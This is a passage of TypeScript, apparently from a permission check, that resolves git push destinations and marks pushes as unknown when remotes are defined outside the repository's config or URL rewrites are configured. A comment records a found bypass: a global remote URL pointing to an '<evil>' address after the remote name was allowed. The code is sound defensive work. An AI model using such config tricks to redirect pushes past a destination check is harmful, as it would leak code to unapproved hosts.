        if (d) put({ repo, destination: d }); else unknown ??= isLocalGitAddress(line) ? LOCAL : "a remote address is not plain";
      }
      continue;
    }
    if (t.remote === null) { unknown ??= "the default push remote has no address"; continue; }
    // `get-url` answers only for remotes in the repository's own config; git push also uses one defined only in the
    // global config or an include (verify r3: global `remote.foo.url=<evil>` after `foo` was allowed as a folder).
    if (/[\r\n]/.test(remote) || remoteKeys.split("\n").some((k) => k === `remote.${remote}.url` || k === `remote.${remote}.pushurl`)) { unknown ??= "a remote defined outside the repository"; continue; }
    // A written-out address: an insteadOf / pushInsteadOf rewrite would send it elsewhere.
    if (rewrites) { unknown ??= "url rewrites are configured"; continue; }
    const d = destOf(remote);
    if (d) put({ repo, destination: d }); else unknown ??= isLocalGitAddress(remote) ? LOCAL : "the push address is not plain";
  }
  const pairs = [...out.values()].sort((a, b) => (a.destination + "\0" + (a.repo ?? "")).localeCompare(b.destination + "\0" + (b.repo ?? "")));
  return { destinations: [...new Set(pairs.map((p) => p.destination))].sort(), pairs, unknown };
}
